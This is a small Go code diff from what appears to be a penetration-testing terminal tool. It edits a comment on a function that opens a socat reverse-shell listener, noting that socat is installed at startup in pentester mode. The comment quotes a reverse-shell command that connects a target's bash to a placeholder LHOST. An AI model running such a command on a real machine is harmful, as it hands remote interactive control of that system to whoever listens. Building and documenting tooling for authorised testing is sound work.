@@ -130,7 +130,8 @@ func (m *model) openTermPane() {
 // openRevTermPane opens a fully-emulated reverse-shell catcher: a socat listener
 // tied to the pane's own PTY. When the target connects back (e.g. with
 // `socat tcp:LHOST:port exec:'bash -li',pty,stderr,setsid,sigint,sane`) the operator
-// gets a real interactive terminal. socat must be installed in the sandbox.
+// gets a real interactive terminal. Needs socat in the sandbox (pentester mode
+// best-effort installs it at startup — see ensureSocat).
 func (m *model) openRevTermPane(port int) {
 	m.termSeq++
 	id := core.AgentID(fmt.Sprintf("Term#%d", m.termSeq))
